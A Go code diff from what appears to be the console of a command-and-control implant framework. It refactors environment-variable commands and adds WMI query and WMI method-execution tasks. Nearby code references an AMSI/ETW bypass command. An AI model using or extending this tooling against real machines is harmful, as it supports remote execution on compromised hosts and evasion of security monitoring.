@@ -80,15 +80,14 @@ kill 1234
 	}
 
 	setEnvCmd := &cobra.Command{
-		Use:   consts.ModuleSetEnv + " [env-key] [env-value]",
+		Use:   consts.SubCommandName(consts.ModuleSetEnv) + " [env-key] [env-value]",
 		Short: "Set environment variable",
 		Args:  cobra.ExactArgs(2),
-		Run: func(cmd *cobra.Command, args []string) {
-			SetEnvCmd(cmd, con)
-			return
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return SetEnvCmd(cmd, con)
 		},
 		Annotations: map[string]string{
-			"depend": consts.ModuleEnv,
+			"depend": consts.ModuleSetEnv,
 		},
 		Example: `~~~
 	setenv key1 value1
@@ -100,7 +99,7 @@ kill 1234
 		carapace.ActionValues().Usage("value"))
 
 	unSetEnvCmd := &cobra.Command{
-		Use:   consts.ModuleUnsetEnv + " [env-key]",
+		Use:   consts.SubCommandName(consts.ModuleUnsetEnv) + " [env-key]",
 		Short: "Unset environment variable",
 		Args:  cobra.ExactArgs(1),
 		Run: func(cmd *cobra.Command, args []string) {
@@ -108,7 +107,7 @@ kill 1234
 			return
 		},
 		Annotations: map[string]string{
-			"depend": consts.ModuleEnv,
+			"depend": consts.ModuleUnsetEnv,
 		},
 		Example: `~~~
 	unsetenv key1
@@ -117,6 +116,7 @@ kill 1234
 
 	common.BindArgCompletions(unSetEnvCmd, nil,
 		carapace.ActionValues().Usage("environment variable"))
+
 	envCmd.AddCommand(unSetEnvCmd, setEnvCmd)
 	netstatCmd := &cobra.Command{
 		Use:   consts.ModuleNetstat,
@@ -163,6 +163,28 @@ bypass --amsi --etw
 		f.Bool("etw", false, "Bypass ETW")
 	})
 
+	wmiQueryCmd := &cobra.Command{
+		Use:   consts.ModuleWmiQuery,
+		Short: "Perform a WMI query",
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return WmiQueryCmd(cmd, con)
+		},
+	}
+	wmiQueryCmd.Flags().String("namespace", "", "WMI namespace (e.g., root\\cimv2)")
+	wmiQueryCmd.Flags().StringSlice("args", []string{}, "Arguments for the WMI query")
+
+	wmiExecuteCmd := &cobra.Command{
+		Use:   consts.ModuleWmiExec,
+		Short: "Execute a WMI method",
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return WmiExecuteCmd(cmd, con)
+		},
+	}
+	wmiExecuteCmd.Flags().String("namespace", "", "WMI namespace (e.g., root\\cimv2)")
+	wmiExecuteCmd.Flags().String("class_name", "", "WMI class name")
+	wmiExecuteCmd.Flags().String("method_name", "", "WMI method name")
+	wmiExecuteCmd.Flags().StringToString("params", map[string]string{}, "Parameters for the WMI method")
+
 	return []*cobra.Command{
 		whoamiCmd,
 		killCmd,
@@ -171,6 +193,8 @@ bypass --amsi --etw
 		netstatCmd,
 		infoCmd,
 		bypassCmd,
+		wmiQueryCmd,
+		wmiExecuteCmd,
 	}
 }
 
@@ -182,25 +206,7 @@ func Register(con *repl.Console) {
 		func(rpc clientrpc.MaliceRPCClient, sess *core.Session) (*clientpb.Task, error) {
 			return Env(rpc, sess)
 		},
-		func(ctx *clientpb.TaskContext) (interface{}, error) {
-			envSet := ctx.Spite.GetResponse().GetKv()
-			var rowEntries []table.Row
-			var row table.Row
-			tableModel := tui.NewTable([]table.Column{
-				{Title: "Key", Width: 20},
-				{Title: "Value", Width: 70},
-			}, true)
-			for k, v := range envSet {
-				row = table.Row{
-					k,
-					v,
-				}
-				rowEntries = append(rowEntries, row)
-			}
-			tableModel.SetRows(rowEntries)
-			tableModel.Title = consts.ModuleEnv
-			return tableModel.View(), nil
-		}, nil)
+		common.ParseKVResponse, common.FormatKVResponse)
 
 	con.RegisterImplantFunc(
 		consts.ModuleSetEnv,
@@ -365,4 +371,6 @@ func Register(con *repl.Console) {
 		common.ParseStatus,
 		nil,
 	)
+
+	RegisterWmiFunc(con)
 }
